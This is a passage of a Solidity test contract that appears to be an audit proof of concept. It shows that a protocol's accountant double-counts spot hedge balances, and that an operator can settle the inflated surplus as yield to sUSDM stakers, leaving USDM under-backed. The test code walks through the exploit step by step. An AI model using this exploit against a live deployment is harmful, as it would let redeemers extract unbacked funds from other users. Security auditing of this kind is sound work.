// 3. [T=1] MonetrixAccountant._readL1Backing() reads this aggregate perp value AND iterates over cfg.tradeableAssets() to add the spot balances again via the 0x801 precompile.
// 4. [T=2] This double-counting inflates totalBackingSigned() and consequently surplus() / distributableSurplus() beyond the true economic backing.
// 5. [T=3] The operator calls vault.settle() with a proposedYield equal to the inflated distributableSurplus.
// 6. [Assert] The settlement succeeds and yield is distributed to sUSDM, proving that phantom backing was monetized and USDM backing is diluted below 1:1.

contract AuditAgentPoC is SimulatorBase {
    function test_exploit() public {
        // Step 1 & 2: Read the inflated accounting values
        int256 totalBacking = accountant.totalBackingSigned();
        int256 currentSurplus = accountant.surplus();
        int256 distributable = accountant.distributableSurplus();

        console.log("Step 2: totalBacking =", totalBacking);
        console.log("Step 2: surplus =", currentSurplus);
        console.log("Step 2: distributableSurplus =", distributable);

        // The double-counting of spot hedge tokens guarantees a positive inflated surplus
        // even if the perp position is perfectly delta-neutral and has generated 0 real yield.
        assertGt(distributable, 0, "Double-counting inflates distributable surplus above true economic yield");

        uint256 inflatedYield = uint256(distributable);

        // Step 3: Capture sUSDM total assets before the phantom yield injection
        sUSDM susdmToken = sUSDM(vault.susdm());
        uint256 susdmAssetsBefore = susdmToken.totalAssets();
        console.log("Step 3: sUSDM totalAssets before =", susdmAssetsBefore);

        // Step 4: Operator settles the daily PnL using the inflated proposedYield
        // This calls accountant.settleDailyPnL() internally, which registers the phantom yield
        // and transfers it to the YieldEscrow for distribution to sUSDM stakers.
        vm.prank(operator);
        vault.settle(inflatedYield);

        // Step 5: Verify the phantom yield was successfully processed
        uint256 susdmAssetsAfter = susdmToken.totalAssets();
        console.log("Step 5: sUSDM totalAssets after =", susdmAssetsAfter);

        // The sUSDM vault now claims to hold more assets than actually exist in the protocol,
        // diluting the USDM backing ratio below 1:1 and allowing the next redeemer to extract unbacked USDC.
        assertGt(susdmAssetsAfter, susdmAssetsBefore, "Phantom yield from double-counted spot tokens was successfully distributed to sUSDM");
    }
}

